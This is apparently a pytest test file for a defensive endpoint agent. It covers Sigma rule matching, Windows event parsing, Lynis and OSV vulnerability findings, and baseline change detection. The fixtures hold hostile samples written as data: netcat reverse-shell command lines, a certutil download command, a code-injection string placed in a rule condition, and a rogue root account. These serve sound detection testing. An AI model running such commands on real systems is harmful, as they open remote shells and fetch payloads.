"""Sigma evaluator, Windows event parsing, Lynis, OSV lookup, baseline."""
import pytest

from endpoint_agent.analyzer.sigma_engine import (SigmaEngine, _parse_condition,
                                                  _Unsupported, parse_winevents)
from endpoint_agent.analyzer.lynis import lynis_findings
from endpoint_agent.analyzer.vuln import OSVClient, vuln_findings, ecosystem_for, parse_packages
from endpoint_agent.analyzer.baseline import BaselineStore, snapshot
from endpoint_agent.analyzer.analyzer import Severity
from endpoint_agent.collector.base import CollectionResult, CommandOutput


def _result(os_name="linux", host="10.0.0.5", **outputs):
    r = CollectionResult(host=host, os_name=os_name, transport="test", started_at="t")
    for key, value in outputs.items():
        rc, text = value if isinstance(value, tuple) else (0, value)
        r.outputs[key] = CommandOutput(key, "x", rc, text, "", 0.0)
    return r


def _engine(tmp_path, **rules):
    d = tmp_path / "sigma"
    d.mkdir(exist_ok=True)
    for name, text in rules.items():
        (d / f"{name}.yml").write_text(text)
    return SigmaEngine(str(d))


# --- sigma ------------------------------------------------------------------
def test_condition_parser_precedence_and_quantifiers():
    assert _parse_condition("a or b and not c") == \
        ("or", ("sel", "a"), ("and", ("sel", "b"), ("not", ("sel", "c"))))
    assert _parse_condition("1 of sel_* and not all of filter_*") == \
        ("and", ("of", "any", "sel_*"), ("not", ("of", "all", "filter_*")))


@pytest.mark.parametrize("bad", ["a | count() > 5", "a and", "(a or b", "a b"])
def test_condition_parser_rejects_what_it_cannot_evaluate(bad):
    with pytest.raises(_Unsupported):
        _parse_condition(bad)


def test_condition_text_is_never_executed(tmp_path):
    eng = _engine(tmp_path, evil="""
title: evil
logsource: {category: process_creation}
detection:
  sel: {Image: x}
  condition: __import__('os').system('touch /tmp/pwned_by_sigma')
""")
    assert eng.rules == [] and eng.skipped


AUTH = ("2026-11-18T03:00:01 kali sshd[811]: Failed password for invalid user admin from 203.0.113.7 port 4242 ssh2\n"
        "2026-11-18T03:00:09 kali sudo: kali : TTY=pts/0 ; COMMAND=/usr/bin/apt update\n")


def test_keyword_rule_matches_auth_log(tmp_path):
    eng = _engine(tmp_path, brute="""
title: SSH failed logins
level: medium
logsource: {product: linux, service: sshd}
detection:
  keywords:
    - 'Failed password for invalid user'
  condition: keywords
""")
    f = eng.match(_result(auth_log=AUTH))
    assert len(f) == 1 and "Failed password" in f[0].evidence


def test_filter_and_all_modifier(tmp_path):
    eng = _engine(tmp_path, rev="""
title: Reverse shell
level: high
logsource: {category: process_creation, product: linux}
detection:
  selection:
    Image|endswith: ['/nc', '/ncat']
    CommandLine|contains|all: ['-e', '/bin/']
  filter_admin:
    User: backup
  condition: selection and not 1 of filter_*
""")
    procs = "  PID  PPID USER     COMMAND         COMMAND\n" \
            "  666     1 root     nc              /usr/bin/nc -e /bin/bash 10.0.0.1 4444\n" \
            "  667     1 backup   nc              /usr/bin/nc -e /bin/sh 10.0.0.2 9\n" \
            "  668     1 kali     nc              /usr/bin/nc -l 8080\n"
    f = eng.match(_result(processes=procs))
    assert len(f) == 1 and "1 hendelse" in f[0].detail and f[0].severity == Severity.HIGH


def test_linux_rule_does_not_run_on_windows(tmp_path):
    eng = _engine(tmp_path, r="""
title: linux only
logsource: {category: process_creation, product: linux}
detection: {sel: {Image|contains: nc}, condition: sel}
""")
    assert eng.match(_result(os_name="windows")) == []


def test_unsupported_rules_are_skipped_not_half_run(tmp_path):
    eng = _engine(tmp_path, b64="""
title: b64
logsource: {category: process_creation}
detection: {sel: {CommandLine|base64offset|contains: x}, condition: sel}
""", web="""
title: web
logsource: {category: webserver}
detection: {sel: {a: b}, condition: sel}
""")
    assert eng.rules == [] and len(eng.skipped) == 2


WINXML = ("<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>"
          "<Provider Name='Microsoft-Windows-Security-Auditing'/><EventID>4720</EventID>"
          "<Channel>Security</Channel><Computer>WIN10</Computer></System><EventData>"
          "<Data Name='TargetUserName'>backdoor</Data><Data Name='SubjectUserName'>admin</Data>"
          "</EventData></Event>\n"
          "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>"
          "<EventID>4688</EventID><Channel>Security</Channel></System><EventData>"
          "<Data Name='NewProcessName'>C:\\Windows\\System32\\certutil.exe</Data>"
          "<Data Name='CommandLine'>certutil -urlcache -f http://x/a.exe</Data></EventData></Event>")


def test_windows_events_parsed_and_matched(tmp_path):
    recs = parse_winevents(WINXML)
    assert recs[0]["EventID"] == "4720" and recs[0]["TargetUserName"] == "backdoor"
    eng = _engine(tmp_path, acct="""
title: Local account created
level: high
logsource: {product: windows, service: security}
detection: {sel: {EventID: 4720}, condition: sel}
""", lol="""
title: Certutil download
level: high
logsource: {category: process_creation, product: windows}
detection:
  sel: {Image|endswith: '\\certutil.exe', CommandLine|contains: urlcache}
  condition: sel
""")
    titles = sorted(f.title for f in eng.match(_result(os_name="windows",
                                                       events_security=WINXML)))
    assert titles == ["Sigma: Certutil download", "Sigma: Local account created"]


def test_winevents_with_entities_are_refused():
    assert parse_winevents("<!DOCTYPE x [<!ENTITY a 'b'>]><Event><System><EventID>1</EventID></System></Event>") == []


# --- lynis ------------------------------------------------------------------
def test_lynis_report_parsed():
    rep = ("lynis_version=3.1.7\nhardening_index=61\n"
           "warning[]=PKGS-7392|Found one or more vulnerable packages.|-|-|\n"
           "suggestion[]=SSH-7408|Consider hardening SSH configuration|AllowTcpForwarding (set YES to NO)|-|\n")
    f = lynis_findings(_result(lynis=rep))
    assert [x.severity for x in f] == [Severity.INFO, Severity.MEDIUM, Severity.LOW]
    assert "PKGS-7392" in f[1].title and all(x.source == "lynis" for x in f)


def test_lynis_absent_gives_nothing():
    assert lynis_findings(_result()) == []


# --- OSV --------------------------------------------------------------------
DEBIAN = 'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\nID=debian\nVERSION_ID="12"\n'
KALI = 'ID=kali\nVERSION_ID="2026.3"\n'
PKGS = "openssl\t3.0.9-1\tlibssl3\nopenssl\t3.0.9-1\topenssl\nbash\t5.2.15-2\tbash\n"


def test_ecosystem_mapping():
    assert ecosystem_for(DEBIAN) == ("Debian:12", True, "debian")
    assert ecosystem_for('ID=ubuntu\nVERSION_ID="24.04"\nVERSION="24.04.1 LTS (Noble)"\n')[0] == "Ubuntu:24.04:LTS"
    assert ecosystem_for(KALI)[0] is None
    assert ecosystem_for(KALI, "13") == ("Debian:13", False, "kali")


def test_packages_deduplicated_by_source():
    assert parse_packages(PKGS) == [("openssl", "3.0.9-1"), ("bash", "5.2.15-2")]


def _fake_osv(calls):
    def post(url, payload):
        calls.append(payload)
        return {"results": [{"vulns": [{"id": "CVE-2024-0001"}, {"id": "CVE-2024-0002"}]}
                            if q["package"]["name"] == "openssl" else {}
                            for q in payload["queries"]]}
    return post


def test_vuln_findings_and_cache(tmp_path, audit):
    calls = []
    client = OSVClient(cache_path=tmp_path / "c.json", post=_fake_osv(calls))
    res = _result(os_release=DEBIAN, packages_src=PKGS)
    f = vuln_findings(res, client, audit=audit)
    assert len(f) == 1 and "openssl 3.0.9-1: 2" in f[0].title and f[0].confirmed
    assert calls[0]["queries"][0] == {"package": {"name": "openssl", "ecosystem": "Debian:12"},
                                      "version": "3.0.9-1"}
    assert "10.0.0.5" not in str(calls)                 # no host identifiers leave the box
    vuln_findings(res, OSVClient(cache_path=tmp_path / "c.json", post=_fake_osv(calls)))
    assert len(calls) == 1                               # second run served from cache
    assert any(e.action == "vuln.osv_lookup" and e.detail.get("left_box") for e in audit.events())


def test_vuln_pagination_followed(tmp_path):
    pages = iter([{"results": [{"vulns": [{"id": "A"}], "next_page_token": "t"}]},
                  {"results": [{"vulns": [{"id": "B"}]}]}])
    client = OSVClient(cache_path=tmp_path / "c.json", post=lambda u, p: next(pages))
    assert client.query("Debian:12", [("x", "1")]) == {("x", "1"): ["A", "B"]}


def test_kali_without_mapping_says_so_and_with_mapping_is_unconfirmed(tmp_path):
    client = OSVClient(cache_path=tmp_path / "c.json", post=_fake_osv([]))
    res = _result(os_release=KALI, packages_src=PKGS)
    f = vuln_findings(res, client)
    assert len(f) == 1 and f[0].severity == Severity.INFO and "kali" in f[0].detail
    f = vuln_findings(res, client, kali_as_debian="13")
    assert f[0].confirmed is False and "Omtrentlig" in f[0].detail


def test_osv_unreachable_is_reported_not_raised(tmp_path):
    def boom(url, payload):
        raise OSError("network down")
    f = vuln_findings(_result(os_release=DEBIAN, packages_src=PKGS),
                      OSVClient(cache_path=tmp_path / "c.json", post=boom))
    assert len(f) == 1 and "feilet" in f[0].title


# --- baseline ---------------------------------------------------------------
USERS = "root:x:0:0:root:/root:/bin/bash\nkali:x:1000:1000::/home/kali:/bin/zsh\n"
LISTEN = "Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n" \
         "tcp   LISTEN 0      128    0.0.0.0:22          0.0.0.0:*     users:((\"sshd\",pid=1,fd=3))\n"


def test_first_run_creates_baseline_then_clean_run_is_silent(tmp_path):
    store = BaselineStore(tmp_path)
    snap = snapshot(_result(users=USERS, listening=LISTEN))
    assert [f.title for f in store.evaluate("h", snap)] == ["Baseline opprettet"]
    assert store.evaluate("h", snap) == []


def test_changes_are_reported_until_accepted(tmp_path):
    store = BaselineStore(tmp_path)
    store.evaluate("h", snapshot(_result(users=USERS, listening=LISTEN)))
    changed = snapshot(_result(
        users=USERS + "evil:x:0:0::/root:/bin/sh\n",
        listening=LISTEN.replace('users:(("sshd",pid=1,fd=3))', 'users:(("sshd",pid=999,fd=3))')
        + "tcp   LISTEN 0      5      0.0.0.0:4444        0.0.0.0:*\n"))
    titles = {f.title: f.severity for f in store.evaluate("h", changed)}
    assert titles == {"Ny brukerkonto: evil": Severity.HIGH,
                      "Ny konto med administrator-/root-rettigheter: evil": Severity.CRITICAL,
                      "Ny lyttende port: tcp 0.0.0.0:4444": Severity.MEDIUM}   # pid change ignored
    assert len(store.evaluate("h", changed)) == 3          # still reported
    store.accept("h")
    assert store.evaluate("h", changed) == []


def test_failed_command_is_not_reported_as_everything_removed(tmp_path):
    store = BaselineStore(tmp_path)
    store.evaluate("h", snapshot(_result(users=USERS, listening=LISTEN)))
    broken = snapshot(_result(users=(1, ""), listening=LISTEN))
    assert "users" not in broken
    assert store.evaluate("h", broken) == []


def test_file_integrity_changes(tmp_path):
    from endpoint_agent.collector.files import FileSample
    store = BaselineStore(tmp_path)
    r1 = _result(); r1.files = [FileSample("/opt/a", 1, 0, "aa" * 32), FileSample("/opt/b", 1, 0, "bb" * 32)]
    r2 = _result(); r2.files = [FileSample("/opt/a", 1, 0, "ff" * 32), FileSample("/opt/c", 1, 0, "cc" * 32)]
    store.evaluate("h", snapshot(r1))
    assert sorted(f.title for f in store.evaluate("h", snapshot(r2))) == \
        ["Fil endret: /opt/a", "Fil fjernet: /opt/b", "Ny fil: /opt/c"]
